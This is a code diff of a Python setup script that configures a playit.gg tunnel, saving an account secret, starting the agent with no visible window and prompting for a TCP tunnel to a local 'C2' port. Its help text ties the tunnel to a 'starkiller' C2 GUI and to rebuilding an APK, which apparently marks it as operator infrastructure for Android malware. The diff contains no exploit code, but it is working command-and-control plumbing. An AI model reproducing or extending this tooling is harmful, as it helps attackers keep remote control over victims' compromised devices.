@@ -61,6 +61,7 @@ PAYLOADS_DIR = os.path.join(SCRIPT_DIR, "payloads")
 DESKTOP = os.path.expanduser("~/Desktop")
 PLAYIT_EXE = os.path.join(TOOLS_DIR, "playit.exe")
 PLAYIT_ADDR_FILE = os.path.join(TOOLS_DIR, "playit_addr.txt")
+PLAYIT_SECRET_FILE = os.path.join(TOOLS_DIR, "playit_secret.txt")
 
 PLAYIT_RELEASES_API = (
     "https://api.github.com/repos/playit-cloud/playit-agent/releases/latest"
@@ -184,16 +185,38 @@ def download_playit():
         return False
 
 
+def load_playit_secret():
+    if os.path.exists(PLAYIT_SECRET_FILE):
+        return open(PLAYIT_SECRET_FILE).read().strip()
+    return None
+
+
+def save_playit_secret(secret):
+    os.makedirs(TOOLS_DIR, exist_ok=True)
+    with open(PLAYIT_SECRET_FILE, "w") as f:
+        f.write(secret.strip() + "\n")
+    ok(f"Saved secret -> tools/playit_secret.txt")
+
+
 def start_playit():
+    cmd = [PLAYIT_EXE]
+    secret = load_playit_secret()
+    if secret:
+        cmd += ["--secret", secret]
+    else:
+        warn("No secret found in tools/playit_secret.txt")
+        warn("Run --setup-playit first to configure your secret key")
+        sys.exit(1)
+
     proc = subprocess.Popen(
-        [PLAYIT_EXE],
+        cmd,
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
         creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
     )
     time.sleep(2)
     if proc.poll() is not None:
-        warn("playit.exe exited immediately -- check tools/playit.exe is valid")
+        warn("playit.exe exited immediately -- bad secret or network error")
         sys.exit(1)
     return proc
 
@@ -250,14 +273,13 @@ def save_playit_addr(host, port):
 
 
 def setup_playit():
-    """Full one-time playit setup wizard."""
-    import threading
+    """Full one-time playit setup wizard (v1.0.x --secret mode)."""
     import webbrowser
 
     print()
-    print("  +----------------------------------------+")
-    print("  |  PLAYIT.GG FIRST-TIME SETUP            |")
-    print("  +----------------------------------------+")
+    print("  +--------------------------------------------------+")
+    print("  |  PLAYIT.GG FIRST-TIME SETUP (v1.0.x)            |")
+    print("  +--------------------------------------------------+")
     print()
 
     if not os.path.exists(PLAYIT_EXE):
@@ -266,79 +288,75 @@ def setup_playit():
     else:
         ok("playit.exe already in tools/")
 
-    # Kill any stale playit process so we get a fresh claim URL
+    print()
+    print("  playit v1.0.x needs a secret key from your account.")
+    print()
+    print("  Step 1 -- get your secret key:")
+    print("    a) Go to https://playit.gg and sign up / log in")
+    print("    b) Dashboard -> click your username (top right) -> Account")
+    print("    c) Look for 'Secret Key' or 'Agent Secret'")
+    print("    d) Copy the long key string")
+    print()
+    input("  Press Enter when you have your secret key ready...")
+
+    print()
+    secret = input("  Paste secret key: ").strip()
+    if not secret:
+        warn("No secret entered.")
+        sys.exit(1)
+    save_playit_secret(secret)
+
+    print()
+    ok("Secret saved. Starting playit daemon to verify connection...")
+
+    # Kill any stale instance
     if os.name == "nt":
-        subprocess.run(
-            ["taskkill", "/F", "/IM", "playit.exe"],
-            capture_output=True,
-        )
+        subprocess.run(["taskkill", "/F", "/IM", "playit.exe"], capture_output=True)
         time.sleep(1)
 
-    # Reset config so daemon prints a fresh claim URL on boot
-    toml_path = os.path.join(
-        os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
-        "playit_gg", "playit.toml",
-    )
-    if os.path.exists(toml_path):
-        warn(f"Removing old config: {toml_path}")
-        os.remove(toml_path)
-
-    print()
-    ok("Starting playit.exe -- watch this window for the claim URL...")
-    print()
-
-    # Run in same terminal (no CREATE_NEW_CONSOLE) so output is visible here
-    # Pipe stdout so we can detect the claim URL and auto-open browser
     proc = subprocess.Popen(
-        [PLAYIT_EXE],
+        [PLAYIT_EXE, "--secret", secret],
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
         text=True,
         bufsize=1,
     )
 
-    claim_url = [None]
+    # Stream output for 5 seconds looking for connected/error signals
+    import threading
+    output_lines = []
 
     def stream():
         for line in proc.stdout:
             s = line.rstrip()
             if s:
                 print(f"  {s}")
-            for word in s.split():
-                if "playit.gg/claim/" in word:
-                    claim_url[0] = word.strip("\"'")
+                output_lines.append(s)
 
     t = threading.Thread(target=stream, daemon=True)
     t.start()
-    time.sleep(4)
+    time.sleep(5)
+
+    if proc.poll() is not None:
+        warn("playit.exe exited -- bad secret or connection error (check output above)")
+        sys.exit(1)
+
+    ok("Daemon appears to be running.")
+    proc.terminate()
 
     print()
-    if claim_url[0]:
-        ok(f"Claim URL detected: {claim_url[0]}")
-        print("  Opening browser...")
-        webbrowser.open(claim_url[0])
-    else:
-        warn("No claim URL detected in output yet.")
-        print("  Scroll up and look for a line containing 'playit.gg/claim/...'")
-        print("  Copy that URL and open it in your browser.")
-
-    print()
-    print("  In the browser:")
-    print("  1. Sign up / log in at playit.gg")
-    print("  2. Claim the agent when prompted")
-    print()
-    print("  Then add your tunnel at https://playit.gg:")
-    print("    Tunnels -> Add Tunnel")
+    print("  Step 2 -- create your TCP tunnel:")
+    print("    https://playit.gg -> Tunnels -> Add Tunnel")
     print(f"    Type: TCP  |  Local IP: 127.0.0.1  |  Local port: {C2_LOCAL_PORT}")
     print()
-    print("  Note the assigned address shown in the Tunnels tab")
-    print("  (looks like: abc123.pkn5.at.plygg.com:12345)")
+    print("  Step 3 -- copy the assigned address from the Tunnels tab")
+    print("    (looks like: abc123.pkn5.at.plygg.com:12345)")
     print()
+    webbrowser.open("https://playit.gg")
 
     addr = input("  Enter tunnel address (HOST:PORT): ").strip()
     if ":" not in addr:
         warn("Invalid format. Expected HOST:PORT")
-        proc.terminate()
         sys.exit(1)
 
     host, port_str = addr.rsplit(":", 1)
@@ -350,10 +368,8 @@ def setup_playit():
     print()
     print("  Future use:")
     print("    python server\\starkiller_gui.py   # start C2")
-    print("    python wan.py --mode playit        # start tunnel + rebuild APK")
+    print("    python wan.py --mode playit        # starts daemon + rebuilds APK")
     print()
-    print("  playit.exe still running in background for this session.")
-    print("  Press Ctrl+C or close this terminal when done.")
 
 
 # ---------------------------------------------------------------------------
